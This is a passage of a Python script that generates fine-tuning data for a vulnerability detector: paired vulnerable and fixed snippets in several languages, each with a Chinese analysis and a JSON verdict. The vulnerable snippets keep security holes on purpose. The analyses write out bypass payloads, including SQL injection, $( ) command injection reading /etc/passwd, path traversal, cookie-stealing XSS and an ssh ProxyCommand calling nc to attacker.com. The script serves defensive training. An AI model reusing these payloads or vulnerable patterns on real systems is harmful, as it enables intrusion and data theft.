#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""黑名单绕过 minimal pair 生成器（alpha06-v2.2 修复项，确定性无 API）。

针对弱点挖掘报告根因 3（净化过度信任）：FN 4 条 + 翻转失败 16/20 同源——
模型把黑名单/正则/字符串替换当有效防御（漏报），又把官方修复中的强防御当无效
（误报）。行动映射承诺的"黑名单绕过 minimal pair"由本脚本落地：

12 对（vuln/safe 逐 token 对齐，只改防御一处语义）：
  弱防御形态：关键词黑名单 / 元字符黑名单 / str_replace 删除 / 引号加倍
  绕过向量：MySQL 反斜杠方言、报错函数免关键字、事件处理器免 script 标签、
            $( ) 与换行、参数注入（ssh -o / convert -write）、ORDER BY 免引号、
            单遍替换重组（....//）、SSRF 书写形态变体
  强防御对照：参数化 / PreparedStatement / 白名单 / escapeshellarg / 参数数组 /
              realpath+前缀校验 / Dial 层 IP 段校验 / HTML 实体转义

语言分布：py 3 / php 3 / java 2 / go 2 / js 2；CWE：78×4 / 89×3 / 79×2 / 22×2 / 918×1。
输出：corpus/blacklist_bypass_pairs.jsonl（构建 v2_2 时并入）
"""
import json
import re
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[3]
sys.path.insert(0, str(ROOT))
from graduation_project.prompts import ALPHA05_PROMPT

OUT = ROOT / "experiments/exp_06_finetune/corpus/blacklist_bypass_pairs.jsonl"


def make_record(code, lang, analysis, verdict, meta):
    user = f"代码片段（语言: {lang}）：\n```{lang}\n{code}\n```"
    asst = analysis + "\n\n```json\n" + json.dumps(verdict, ensure_ascii=False) + "\n```"
    return {"messages": [
        {"role": "system", "content": ALPHA05_PROMPT},
        {"role": "user", "content": user},
        {"role": "assistant", "content": asst},
    ], "meta": meta}


def ln(code, marker):
    for i, line in enumerate(code.splitlines(), 1):
        if marker in line:
            return i
    return 1


records = []

# ============================================================
# BB1 python CWE-89：引号加倍 vs MySQL 反斜杠方言（参数化）
# ============================================================
BB1_V = '''import mysql.connector


def query_report(conn, title_filter):
    """报表导出服务调用：title_filter 为用户输入的筛选词。"""
    safe_title = title_filter.replace("'", "''")
    sql = ("SELECT id, title FROM reports "
           "WHERE title LIKE '%" + safe_title + "%' ORDER BY id")
    cur = conn.cursor()
    cur.execute(sql)
    return cur.fetchall()'''
BB1_S = '''import mysql.connector


def query_report(conn, title_filter):
    """报表导出服务调用：title_filter 为用户输入的筛选词。"""
    sql = ("SELECT id, title FROM reports "
           "WHERE title LIKE %s ORDER BY id")
    cur = conn.cursor()
    cur.execute(sql, ("%" + title_filter + "%",))
    return cur.fetchall()'''

_l = ln(BB1_V, "safe_title")
records.append(make_record(BB1_V, "python", f"""分析过程：
1. 第 {ln(BB1_V, 'def query_report')} 行：query_report 是被报表导出服务调用的库函数，本文件没有 request 入口，但 title_filter 参数承载用户输入的筛选词——污点边界=函数参数，无显式 web 入口不等于无外部数据。
2. 第 {_l}→{ln(BB1_V, 'cur.execute')} 行：title_filter 经 replace 加倍单引号后直接拼进 LIKE 模式，conn.execute 执行拼接 SQL。数据流：参数 → 字符串拼接 → SQL 执行。
3. 第 {_l} 行防御核验：replace 把单引号加倍只防引号闭合，但 MySQL 默认开启反斜杠转义——输入 `\\' UNION SELECT password FROM users -- ` 加倍后变为 `\\''`，反斜杠把第一个引号转义成字面量、第二个引号反而闭合了字符串，其后的 UNION 子句原样进入 SQL。字符级转义在带反斜杠方言的数据库中不构成有效防御。
4. 第二入口/替代通道：函数只消费单一参数、第 {ln(BB1_V, 'cur.execute')} 行是唯一 sink，无旁路；防御一旦被绕过即整体失守。
5. 结论：CWE-89 SQL Injection，High。""", {
    "has_vulnerability": True,
    "vulnerability_type": "CWE-89 SQL Injection",
    "risk_level": "High",
    "source": f"line {ln(BB1_V, 'def query_report')}: title_filter 参数（用户筛选词）",
    "sink": f"line {ln(BB1_V, 'cur.execute')}: conn.execute 执行拼接 SQL",
    "explanation": "title_filter -> replace 引号加倍(反斜杠方言下可绕过) -> 拼接进 LIKE 模式 -> execute",
    "fix_suggestion": f"line {ln(BB1_S, 'cur.execute')}: 改用参数化 execute(sql, ('%' + title_filter + '%',))，SQL 文本与数据分离",
}, {"kind": "blacklist_bypass_vuln", "pair": "BB1", "cwe": "CWE-89"}))

records.append(make_record(BB1_S, "python", f"""分析过程：
1. 第 {ln(BB1_S, 'def query_report')} 行：title_filter 参数即污点边界——库函数被上层服务以用户筛选词调用，参数必须按不可信处理。
2. 第 {ln(BB1_S, 'WHERE title LIKE')}→{ln(BB1_S, 'cur.execute')} 行：SQL 文本是含 %s 占位符的固定语句；title_filter 仅作为 ("%" + title_filter + "%",) 的绑定值传入。
3. 第 {ln(BB1_S, 'cur.execute')} 行防御核验：参数化绑定把值作为完整字面量送入协议层——引号、反斜杠、注释符都只是值的内容，无法改变 SQL 语法树；绑定发生在语句解析之后，不存在二次解析通道。该防御类型正确（值与结构分离）、位置在 sink 之前、覆盖全部输入域。
4. 第二入口/替代通道：单参数函数、单一 sink，无绕过绑定的旁路。
5. 结论：无漏洞。""", {
    "has_vulnerability": False,
    "vulnerability_type": "none",
    "risk_level": "None",
    "source": "N/A",
    "sink": "N/A",
    "explanation": "title_filter -> 参数化绑定(%s) -> 值仅为字面量 -> 无法改变 SQL 结构",
    "fix_suggestion": "no fix needed",
}, {"kind": "blacklist_bypass_safe", "pair": "BB1", "cwe": "CWE-89"}))

# ============================================================
# BB2 python CWE-78：元字符黑名单漏换行 vs 参数数组
# ============================================================
BB2_V = '''import subprocess


def convert_document(src_path):
    """文档转换工具：运维平台把用户上传的文件名传入。"""
    banned = [";", "&", "|", "`", "$("]
    for b in banned:
        if b in src_path:
            raise ValueError("illegal filename")
    cmd = "libreoffice --headless --convert-to pdf " + src_path
    return subprocess.run(cmd, shell=True, capture_output=True)'''
BB2_S = '''import subprocess


def convert_document(src_path):
    """文档转换工具：运维平台把用户上传的文件名传入。"""
    if any(c in src_path for c in "\\n\\r\\x00"):
        raise ValueError("illegal filename")
    return subprocess.run(
        ["libreoffice", "--headless", "--convert-to", "pdf", src_path],
        shell=False, capture_output=True)'''

records.append(make_record(BB2_V, "python", f"""分析过程：
1. 第 {ln(BB2_V, 'def convert_document')} 行：convert_document 是运维平台调用的工具函数，src_path 参数承载用户上传的文件名——污点边界=函数参数。
2. 第 {ln(BB2_V, 'banned')}→{ln(BB2_V, 'subprocess.run')} 行：src_path 经黑名单检查后拼进命令字符串，shell=True 交给 /bin/sh 解析执行。
3. 第 {ln(BB2_V, 'banned')} 行防御核验：黑名单只覆盖 ; & | ` $( 五种 shell 语法符号，漏掉了换行符——src_path = `a.docx\\nid > /tmp/pwn` 不含任何被禁字符，但 sh 把换行解释为命令分隔符，第二条命令照常执行。黑名单按"已知危险形态"枚举，永远存在未列举的等价向量，不构成有效防御。
4. 第二入口/替代通道：shell=True 使整个字符串进入 shell 语法层，除拼接点外无其他入口，但 shell 本身就是攻击面的放大器。
5. 结论：CWE-78 OS Command Injection，Critical。""", {
    "has_vulnerability": True,
    "vulnerability_type": "CWE-78 OS Command Injection",
    "risk_level": "Critical",
    "source": f"line {ln(BB2_V, 'def convert_document')}: src_path 参数（用户文件名）",
    "sink": f"line {ln(BB2_V, 'subprocess.run')}: subprocess.run(shell=True) 执行拼接命令",
    "explanation": "src_path -> 黑名单检查(漏换行符) -> 拼接命令串 -> shell=True 解析执行注入命令",
    "fix_suggestion": f"line {ln(BB2_S, 'return subprocess.run')}: 改用参数数组 + shell=False，参数不经 shell 语法解析",
}, {"kind": "blacklist_bypass_vuln", "pair": "BB2", "cwe": "CWE-78"}))

records.append(make_record(BB2_S, "python", f"""分析过程：
1. 第 {ln(BB2_S, 'def convert_document')} 行：src_path 参数即污点边界——用户上传文件名按不可信处理。
2. 第 {ln(BB2_S, 'return subprocess.run')} 行：命令以列表逐项给出，src_path 是其中一个独立 argv 元素，shell=False 直接 execve。
3. 第 {ln(BB2_S, 'return subprocess.run')} 行防御核验：参数数组使每个参数作为整体传给目标程序，不经过任何 shell 语法解析——分号、换行、反引号都退化为文件名里的普通字符，命令结构（程序名与参数个数）在调用点固定。类型正确（消除解析层）、位置在执行点、覆盖全部输入域。第 {ln(BB2_S, 'if any')} 行的换行/回退/空字节拒绝是纵深防御，非唯一防线。
4. 第二入口/替代通道：无 shell 层即无第二解析入口；目标程序 libreoffice 自身的选项解析由参数数组隔离（文件名是最后一个位置参数）。
5. 结论：无漏洞。""", {
    "has_vulnerability": False,
    "vulnerability_type": "none",
    "risk_level": "None",
    "source": "N/A",
    "sink": "N/A",
    "explanation": "src_path -> 参数数组 argv + shell=False -> 元字符退化为字面文件名字符 -> 无 shell 解析层",
    "fix_suggestion": "no fix needed",
}, {"kind": "blacklist_bypass_safe", "pair": "BB2", "cwe": "CWE-78"}))

# ============================================================
# BB3 python CWE-22：单遍 replace 删除重组 vs realpath 前缀校验
# ============================================================
BB3_V = '''import os

ARCHIVE_DIR = "/srv/archive"


def read_manifest(name):
    """归档清单读取：name 来自外部系统提交的归档名。"""
    cleaned = name.replace("../", "")
    path = os.path.join(ARCHIVE_DIR, cleaned)
    with open(path, encoding="utf-8") as f:
        return f.read()'''
BB3_S = '''import os

ARCHIVE_DIR = "/srv/archive"


def read_manifest(name):
    """归档清单读取：name 来自外部系统提交的归档名。"""
    path = os.path.realpath(os.path.join(ARCHIVE_DIR, name))
    if not path.startswith(ARCHIVE_DIR + os.sep):
        raise ValueError("path escape")
    with open(path, encoding="utf-8") as f:
        return f.read()'''

records.append(make_record(BB3_V, "python", f"""分析过程：
1. 第 {ln(BB3_V, 'def read_manifest')} 行：read_manifest 是归档服务的工具函数，name 参数承载外部系统提交的归档名——污点边界=函数参数。
2. 第 {ln(BB3_V, 'cleaned')}→{ln(BB3_V, 'with open')} 行：name 经 replace 删除 "../" 后与基目录拼接，直接 open。
3. 第 {ln(BB3_V, 'cleaned')} 行防御核验：str.replace 是单遍扫描——name = `....//manifest.yaml` 在删除位置 2 处的 "../" 后剩余 `../manifest.yaml`，穿越段原样保留，join 后指向 /srv 之外的任意路径。删除式过滤不改变"路径以段为单位组合"的语义，可被自嵌入输入重组绕过。
4. 第二入口/替代通道：open 是唯一 sink；绝对路径形式经 join 会被拼接压制，但 "../" 重组已足够逃逸。
5. 结论：CWE-22 Path Traversal，High。""", {
    "has_vulnerability": True,
    "vulnerability_type": "CWE-22 Path Traversal",
    "risk_level": "High",
    "source": f"line {ln(BB3_V, 'def read_manifest')}: name 参数（外部归档名）",
    "sink": f"line {ln(BB3_V, 'with open')}: open 打开逃逸后的路径",
    "explanation": "name -> replace('../','') 单遍删除可被 ....// 重组绕过 -> join 逃出 ARCHIVE_DIR -> open 任意文件",
    "fix_suggestion": f"line {ln(BB3_S, 'path = os.path.realpath')}: realpath 规范化后做目录前缀校验",
}, {"kind": "blacklist_bypass_vuln", "pair": "BB3", "cwe": "CWE-22"}))

records.append(make_record(BB3_S, "python", f"""分析过程：
1. 第 {ln(BB3_S, 'def read_manifest')} 行：name 参数即污点边界——外部归档名按不可信处理。
2. 第 {ln(BB3_S, 'path = os.path.realpath')}→{ln(BB3_S, 'with open')} 行：name 先 join 进基目录，再 realpath 解析 "../"、符号链接与冗余段得到真实绝对路径，通过前缀校验后才 open。
3. 第 {ln(BB3_S, 'path = os.path.realpath')}-{ln(BB3_S, 'if not path.startswith')} 行防御核验：校验发生在规范化之后——任何数量、任何嵌套形式的穿越段都会在 realpath 阶段被折叠成最终路径参与检查；基目录以 os.sep 结尾的前缀比较排除了 /srv/archive-evil 这类同前缀目录混淆。类型正确（校验解析结果而非输入字形）、位置在 open 之前、覆盖全部输入域。
4. 第二入口/替代通道：open 是唯一 sink 且被同一校验保护；无旁路。
5. 结论：无漏洞。""", {
    "has_vulnerability": False,
    "vulnerability_type": "none",
    "risk_level": "None",
    "source": "N/A",
    "sink": "N/A",
    "explanation": "name -> join+realpath 规范化 -> 基目录前缀校验 -> 穿越/符号链接均被折叠后拦截",
    "fix_suggestion": "no fix needed",
}, {"kind": "blacklist_bypass_safe", "pair": "BB3", "cwe": "CWE-22"}))

# ============================================================
# BB4 php CWE-89：ORDER BY 注入点免关键字 vs 白名单
# ============================================================
BB4_V = '''<?php
// 订单列表工具：被上游 API 以排序方向参数调用
function list_orders($conn, $sort)
{
    $blocked = array(";", "union", "select", "drop");
    foreach ($blocked as $b) {
        if (stripos($sort, $b) !== false) {
            http_response_code(400);
            exit("bad input");
        }
    }
    $sql = "SELECT order_id, amount FROM orders ORDER BY created_at " . $sort;
    $res = mysqli_query($conn, $sql);
    $rows = mysqli_fetch_all($res, MYSQLI_ASSOC);
    return $rows;
}'''
BB4_S = '''<?php
// 订单列表工具：被上游 API 以排序方向参数调用
function list_orders($conn, $sort)
{
    $allowed = array("asc", "desc");
    if (!in_array(strtolower($sort), $allowed, true)) {
        $sort = "asc";
    }
    $sql = "SELECT order_id, amount FROM orders ORDER BY created_at " . $sort;
    $res = mysqli_query($conn, $sql);
    $rows = mysqli_fetch_all($res, MYSQLI_ASSOC);
    return $rows;
}'''

records.append(make_record(BB4_V, "php", f"""分析过程：
1. 第 {ln(BB4_V, 'function list_orders')} 行：list_orders 是被上游 API 调用的工具函数，$sort 参数承载外部排序方向——污点边界=函数参数。
2. 第 {ln(BB4_V, '$blocked')}→{ln(BB4_V, 'mysqli_query')} 行：$sort 经关键词黑名单后拼接到 ORDER BY 子句尾部执行。
3. 第 {ln(BB4_V, '$blocked')} 行防御核验：黑名单按关键词拦截，但 ORDER BY 注入点无需 UNION/SELECT 也能利用——$sort = `updatexml(1,concat(0x7e,version()),1)` 全部由函数名与十六进制字面量构成，不命中任何黑名单词，报错回显直接带出数据库版本与数据；引号本身也未列入黑名单。黑名单枚举的是"常见攻击语句的字形"，不是注入的语义条件。
4. 第二入口/替代通道：mysqli_query 是唯一 sink；ORDER BY 位置的布尔盲注（IF/CASE）同样不依赖黑名单词。
5. 结论：CWE-89 SQL Injection，High。""", {
    "has_vulnerability": True,
    "vulnerability_type": "CWE-89 SQL Injection",
    "risk_level": "High",
    "source": f"line {ln(BB4_V, 'function list_orders')}: $sort 参数（外部排序方向）",
    "sink": f"line {ln(BB4_V, 'mysqli_query')}: mysqli_query 执行拼接 SQL",
    "explanation": "$sort -> 关键词黑名单(报错函数免关键字绕过) -> 拼进 ORDER BY -> 注入 SQL 语法单元",
    "fix_suggestion": f"line {ln(BB4_S, '$allowed')}: 改用 in_array 白名单，取值域压到 asc/desc 两个字面量",
}, {"kind": "blacklist_bypass_vuln", "pair": "BB4", "cwe": "CWE-89"}))

records.append(make_record(BB4_S, "php", f"""分析过程：
1. 第 {ln(BB4_S, 'function list_orders')} 行：$sort 参数即污点边界——外部输入按不可信处理。
2. 第 {ln(BB4_S, '$allowed')}→{ln(BB4_S, 'mysqli_query')} 行：$sort 先经白名单收敛，再拼入 SQL。
3. 第 {ln(BB4_S, '$allowed')}-{ln(BB4_S, 'if (!in_array')} 行防御核验：in_array 严格比较（第三个参数 true）把取值域压缩为 asc/desc 两个已知字面量，其余输入一律回退 asc——拼接进 SQL 的只可能是这两个值，任何函数名、引号、注释符都无法进入语句。白名单校验的是"允许的取值"而非"禁止的字形"，与黑名单有本质区别；类型正确、位置在拼接前、覆盖全部输入域。
4. 第二入口/替代通道：排序字段 created_at 为硬编码常量，非输入；$sort 是唯一外部通道。
5. 结论：无漏洞。""", {
    "has_vulnerability": False,
    "vulnerability_type": "none",
    "risk_level": "None",
    "source": "N/A",
    "sink": "N/A",
    "explanation": "$sort -> 白名单严格收敛(asc/desc) -> 拼接值域为固定字面量 -> 无法注入语法单元",
    "fix_suggestion": "no fix needed",
}, {"kind": "blacklist_bypass_safe", "pair": "BB4", "cwe": "CWE-89"}))

# ============================================================
# BB5 php CWE-79：script 标签删除 vs ENT_QUOTES 实体转义
# ============================================================
BB5_V = '''<?php
// 评论渲染工具：渲染外部系统同步来的评论文本
function render_comment($comment)
{
    $clean = str_replace("<script>", "", $comment);
    $clean = str_replace("</script>", "", $clean);
    echo "<div class='comment'>" . $clean . "</div>";
}'''
BB5_S = '''<?php
// 评论渲染工具：渲染外部系统同步来的评论文本
function render_comment($comment)
{
    $clean = htmlspecialchars($comment, ENT_QUOTES, "UTF-8");
    echo "<div class='comment'>" . $clean . "</div>";
}'''

records.append(make_record(BB5_V, "php", f"""分析过程：
1. 第 {ln(BB5_V, 'function render_comment')} 行：render_comment 是评论服务调用的渲染函数，$comment 参数承载外部同步的评论文本——污点边界=函数参数。
2. 第 {ln(BB5_V, '$clean = str_replace')}→{ln(BB5_V, 'echo')} 行：$comment 删除 script 标签后直接 echo 进 HTML body。
3. 第 {ln(BB5_V, '$clean = str_replace')} 行防御核验：删除只针对两种确切字形，两个绕过向量都成立——(a) `<img src=x onerror=alert(document.cookie)>` 完全不含 script 标签，事件处理器即可执行脚本；(b) 嵌套输入 `<scr<script>ipt>alert(1)</scr</script>ipt>` 删除内层标签后重组为完整 `<script>`。按字形删除不改变 HTML 解析语义，不构成有效防御。
4. 第二入口/替代通道：echo 是唯一输出 sink；输出上下文为 HTML 元素内容，无属性/URL 上下文。
5. 结论：CWE-79 Cross-Site Scripting，High。""", {
    "has_vulnerability": True,
    "vulnerability_type": "CWE-79 Cross-Site Scripting",
    "risk_level": "High",
    "source": f"line {ln(BB5_V, 'function render_comment')}: $comment 参数（外部评论文本）",
    "sink": f"line {ln(BB5_V, 'echo')}: echo 输出进 HTML body",
    "explanation": "$comment -> str_replace 删除 script 标签(事件处理器/嵌套重组绕过) -> echo 进 HTML",
    "fix_suggestion": f"line {ln(BB5_S, 'htmlspecialchars')}: htmlspecialchars(ENT_QUOTES) 全量实体转义",
}, {"kind": "blacklist_bypass_vuln", "pair": "BB5", "cwe": "CWE-79"}))

records.append(make_record(BB5_S, "php", f"""分析过程：
1. 第 {ln(BB5_S, 'function render_comment')} 行：$comment 参数即污点边界——外部评论文本按不可信处理。
2. 第 {ln(BB5_S, 'htmlspecialchars')}→{ln(BB5_S, 'echo')} 行：$comment 实体转义后输出进 div 元素内容。
3. 第 {ln(BB5_S, 'htmlspecialchars')} 行防御核验：htmlspecialchars(ENT_QUOTES, UTF-8) 把 < > & ' " 五类语法字符全部转为 HTML 实体——浏览器不再把输出中的任何部分解释为标签或属性边界，事件处理器、嵌套标签、属性逃逸都失去构造前提。转义类型与输出上下文（HTML 元素内容）匹配、位置在输出点、覆盖全部输入域。
4. 第二入口/替代通道：echo 是唯一 sink 且只有这一个输出点；无其他渲染路径。
5. 结论：无漏洞。""", {
    "has_vulnerability": False,
    "vulnerability_type": "none",
    "risk_level": "None",
    "source": "N/A",
    "sink": "N/A",
    "explanation": "$comment -> htmlspecialchars(ENT_QUOTES) 实体化 -> 无标签/属性边界可构造 -> HTML body 安全输出",
    "fix_suggestion": "no fix needed",
}, {"kind": "blacklist_bypass_safe", "pair": "BB5", "cwe": "CWE-79"}))

# ============================================================
# BB6 php CWE-78：元字符黑名单漏 $( vs escapeshellarg
# ============================================================
BB6_V = '''<?php
// 视频转码作业处理器：消费队列里的转码任务
function process_video($job)
{
    $src = $job["src"];
    $banned = array(";", "|", "&", "`");
    foreach ($banned as $b) {
        if (strpos($src, $b) !== false) {
            return false;
        }
    }
    $cmd = "ffmpeg -i " . $src . " -vframes 1 /tmp/thumb.jpg";
    system($cmd);
    return true;
}'''
BB6_S = '''<?php
// 视频转码作业处理器：消费队列里的转码任务
function process_video($job)
{
    $src = $job["src"];
    $arg = escapeshellarg($src);
    $cmd = "ffmpeg -i " . $arg . " -vframes 1 " . escapeshellarg("/tmp/thumb.jpg");
    system($cmd);
    return true;
}'''

records.append(make_record(BB6_V, "php", f"""分析过程：
1. 第 {ln(BB6_V, 'function process_video')} 行：process_video 消费队列转码任务，$job["src"] 承载外部提交的文件名——污点边界=回调参数内的载荷。
2. 第 {ln(BB6_V, '$src =')}→{ln(BB6_V, 'system')} 行：$src 经黑名单检查后拼进命令串，system 交给 shell 执行。
3. 第 {ln(BB6_V, '$banned')} 行防御核验：黑名单漏掉了 $() 命令替换——$src = `$(cat /etc/passwd > /tmp/leak)` 不含任何被禁字符，shell 解析 $() 并在命令替换中执行任意命令。元字符黑名单是按已知字形枚举，等价语法（$( )、换行、制表符）永远枚举不全。
4. 第二入口/替代通道：system 是唯一 sink；ffmpeg 自身的参数注入（-i 后接选项形文件名）是并存的次要通道。
5. 结论：CWE-78 OS Command Injection，Critical。""", {
    "has_vulnerability": True,
    "vulnerability_type": "CWE-78 OS Command Injection",
    "risk_level": "Critical",
    "source": f"line {ln(BB6_V, '$src =')}: $job['src']（队列任务载荷）",
    "sink": f"line {ln(BB6_V, 'system')}: system 执行拼接命令",
    "explanation": "$src -> 元字符黑名单(漏 $() 命令替换) -> 拼接命令串 -> system 经 shell 执行注入",
    "fix_suggestion": f"line {ln(BB6_S, 'escapeshellarg')}: escapeshellarg 包裹参数，元字符退化为字面量",
}, {"kind": "blacklist_bypass_vuln", "pair": "BB6", "cwe": "CWE-78"}))

records.append(make_record(BB6_S, "php", f"""分析过程：
1. 第 {ln(BB6_S, 'function process_video')} 行：$job["src"] 即污点边界——队列载荷按不可信处理。
2. 第 {ln(BB6_S, 'escapeshellarg')}→{ln(BB6_S, 'system')} 行：$src 先经 escapeshellarg 变成被单引号包裹的字面量参数，再拼进命令串。
3. 第 {ln(BB6_S, 'escapeshellarg')} 行防御核验：escapeshellarg 把参数整体包进单引号并把内部单引号转义为 '"'"' 形态——$()、反引号、分号、空格全部成为引号内普通字符，shell 无法把它们再解释为语法单元；转义作用于参数边界而非枚举危险字形，覆盖全部输入域。
4. 第二入口/替代通道：命令中所有变量段均已包裹（含固定路径段），无未包裹的拼接点。
5. 结论：无漏洞。""", {
    "has_vulnerability": False,
    "vulnerability_type": "none",
    "risk_level": "None",
    "source": "N/A",
    "sink": "N/A",
    "explanation": "$src -> escapeshellarg 单引号包裹 -> 元字符退化为字面内容 -> shell 无法解释注入语法",
    "fix_suggestion": "no fix needed",
}, {"kind": "blacklist_bypass_safe", "pair": "BB6", "cwe": "CWE-78"}))

# ============================================================
# BB7 java CWE-89：关键词黑名单漏引号 vs PreparedStatement
# ============================================================
BB7_V = '''package com.example.report;

import java.sql.Connection;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;
import java.util.ArrayList;
import java.util.List;

public class OrderDao {
    private final Connection conn;

    public OrderDao(Connection conn) { this.conn = conn; }

    public List<String> findCustomers(String customer) throws SQLException {
        String lower = customer.toLowerCase();
        if (lower.contains("union") || lower.contains("select") || lower.contains(";")) {
            throw new IllegalArgumentException("bad input");
        }
        String sql = "SELECT id, amount FROM orders WHERE customer = '" + customer + "'";
        Statement st = conn.createStatement();
        ResultSet rs = st.executeQuery(sql);
        List<String> out = new ArrayList<>();
        while (rs.next()) { out.add(rs.getString(1)); }
        return out;
    }
}'''
BB7_S = '''package com.example.report;

import java.sql.Connection;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.util.ArrayList;
import java.util.List;

public class OrderDao {
    private final Connection conn;

    public OrderDao(Connection conn) { this.conn = conn; }

    public List<String> findCustomers(String customer) throws SQLException {
        String sql = "SELECT id, amount FROM orders WHERE customer = ?";
        PreparedStatement ps = conn.prepareStatement(sql);
        ps.setString(1, customer);
        ResultSet rs = ps.executeQuery();
        List<String> out = new ArrayList<>();
        while (rs.next()) { out.add(rs.getString(1)); }
        return out;
    }
}'''

records.append(make_record(BB7_V, "java", f"""分析过程：
1. 第 {ln(BB7_V, 'public List<String> findCustomers')} 行：findCustomers 是被上层服务调用的 DAO 方法，customer 参数承载外部查询词——污点边界=方法参数。
2. 第 {ln(BB7_V, 'String lower')}→{ln(BB7_V, 'st.executeQuery')} 行：customer 经关键词黑名单后拼进 WHERE 字符串字面量，Statement 执行。
3. 第 {ln(BB7_V, 'String lower')} 行防御核验：黑名单拦 union/select/分号，却没拦单引号本身——输入 `smith' OR '1'='1` 不含任何被禁词，第一个引号闭合字符串、注入 OR 永真条件，返回全表。黑名单枚举攻击语句字形，而注入的语义条件是"逃出字面量"，两者不相干。
4. 第二入口/替代通道：executeQuery 是唯一 sink；布尔盲注（AND 1=0/1=1 逐位推断）同样无需黑名单词。
5. 结论：CWE-89 SQL Injection，High。""", {
    "has_vulnerability": True,
    "vulnerability_type": "CWE-89 SQL Injection",
    "risk_level": "High",
    "source": f"line {ln(BB7_V, 'public List<String> findCustomers')}: customer 参数（外部查询词）",
    "sink": f"line {ln(BB7_V, 'st.executeQuery')}: Statement.executeQuery 执行拼接 SQL",
    "explanation": "customer -> 关键词黑名单(单引号未禁) -> 闭合 WHERE 字面量注入 OR 永真 -> 全表返回",
    "fix_suggestion": f"line {ln(BB7_S, 'PreparedStatement ps')}: PreparedStatement + setString 参数绑定",
}, {"kind": "blacklist_bypass_vuln", "pair": "BB7", "cwe": "CWE-89"}))

records.append(make_record(BB7_S, "java", f"""分析过程：
1. 第 {ln(BB7_S, 'public List<String> findCustomers')} 行：customer 参数即污点边界——外部查询词按不可信处理。
2. 第 {ln(BB7_S, 'String sql')}→{ln(BB7_S, 'ps.executeQuery')} 行：SQL 语句为固定文本，customer 通过 setString 绑定到 ? 占位符。
3. 第 {ln(BB7_S, 'PreparedStatement ps')}-{ln(BB7_S, 'ps.setString')} 行防御核验：预编译先发送 SQL 骨架完成解析，customer 只作为类型化叶子节点绑定进执行计划——引号、注释符、OR 关键字都是值的内容，不存在重新解析的通道。防御类型正确（结构与值分离）、位置在执行前、覆盖全部输入域。
4. 第二入口/替代通道：单参数单 sink；无拼接点即无注入面。
5. 结论：无漏洞。""", {
    "has_vulnerability": False,
    "vulnerability_type": "none",
    "risk_level": "None",
    "source": "N/A",
    "sink": "N/A",
    "explanation": "customer -> setString 绑定到 ? 占位符 -> 值仅为执行计划叶子节点 -> 无法改变 SQL 结构",
    "fix_suggestion": "no fix needed",
}, {"kind": "blacklist_bypass_safe", "pair": "BB7", "cwe": "CWE-89"}))

# ============================================================
# BB8 java CWE-78：shell 元字符黑名单不防参数注入 vs 白名单+参数数组
# ============================================================
BB8_V = '''package com.example.ops;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.Arrays;
import java.util.List;

public class HealthChecker {
    public String runCheck(String node) throws Exception {
        List<String> banned = Arrays.asList(";", "&", "|", "$", "`", ">", "<");
        for (String b : banned) {
            if (node.contains(b)) throw new IllegalArgumentException("bad node");
        }
        String cmd = "ssh -o BatchMode=yes monitoring@" + node + " uptime";
        Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
        BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
        return r.readLine();
    }
}'''
BB8_S = '''package com.example.ops;

import java.io.BufferedReader;
import java.io.InputStreamReader;

public class HealthChecker {
    public String runCheck(String node) throws Exception {
        if (!node.matches("[A-Za-z0-9.-]+")) {
            throw new IllegalArgumentException("bad node");
        }
        ProcessBuilder pb = new ProcessBuilder(
                "ssh", "-o", "BatchMode=yes", "monitoring@" + node, "uptime");
        pb.redirectErrorStream(true);
        Process p = pb.start();
        BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
        return r.readLine();
    }
}'''

records.append(make_record(BB8_V, "java", f"""分析过程：
1. 第 {ln(BB8_V, 'public String runCheck')} 行：runCheck 接收外部节点名参数——污点边界=方法参数。
2. 第 {ln(BB8_V, 'List<String> banned')}→{ln(BB8_V, 'Runtime.getRuntime')} 行：node 经元字符黑名单后拼进 ssh 命令串，经 sh -c 解析执行。
3. 第 {ln(BB8_V, 'List<String> banned')} 行防御核验：黑名单只覆盖 shell 语法层，不覆盖目标命令的参数层——node = `-oProxyCommand=nc attacker.com 4444 -oStrictHostKeyChecking=no` 不含任何被禁字符，但 ssh 会把它解析为自己的 -o 选项，ProxyCommand 让 ssh 在连接前执行任意命令。即使完全消除 shell 元字符，未约束取值的参数仍能注入命令行选项。
4. 第二入口/替代通道：sh -c 使整串进入 shell 解析层；ssh 选项注入是并列的第二通道。
5. 结论：CWE-78 OS Command Injection，Critical。""", {
    "has_vulnerability": True,
    "vulnerability_type": "CWE-78 OS Command Injection",
    "risk_level": "Critical",
    "source": f"line {ln(BB8_V, 'public String runCheck')}: node 参数（外部节点名）",
    "sink": f"line {ln(BB8_V, 'Runtime.getRuntime')}: sh -c 执行拼接命令，ssh 解析注入选项",
    "explanation": "node -> 元字符黑名单(不防参数注入) -> 拼进 ssh 命令 -> -oProxyCommand 执行任意命令",
    "fix_suggestion": f"line {ln(BB8_S, 'node.matches')}: 主机名白名单 + ProcessBuilder 参数数组",
}, {"kind": "blacklist_bypass_vuln", "pair": "BB8", "cwe": "CWE-78"}))

records.append(make_record(BB8_S, "java", f"""分析过程：
1. 第 {ln(BB8_S, 'public String runCheck')} 行：node 参数即污点边界——外部节点名按不可信处理。
2. 第 {ln(BB8_S, 'node.matches')}→{ln(BB8_S, 'pb.start')} 行：node 先过主机名字符白名单，再作为固定 argv 数组中的第 4 个元素传给 ssh。
3. 第 {ln(BB8_S, 'node.matches')}-{ln(BB8_S, 'ProcessBuilder pb')} 行防御核验：双重防线——正则 [A-Za-z0-9.-]+ 把取值域压缩为纯主机名形态（不含空格与连字符起始的选项形 token，不可能携带 -o）；ProcessBuilder 逐项传 argv、不经 shell，命令结构（程序名 + 固定选项顺序）在调用点完全固定。类型正确、位置在执行前、覆盖全部输入域。
4. 第二入口/替代通道：无 shell 层；node 位于 monitoring@ 后的用户名@主机位，即使含 @ 也不会成为独立 argv。
5. 结论：无漏洞。""", {
    "has_vulnerability": False,
    "vulnerability_type": "none",
    "risk_level": "None",
    "source": "N/A",
    "sink": "N/A",
    "explanation": "node -> 主机名白名单 + ProcessBuilder argv 数组 -> 无 shell 解析、无法注入选项",
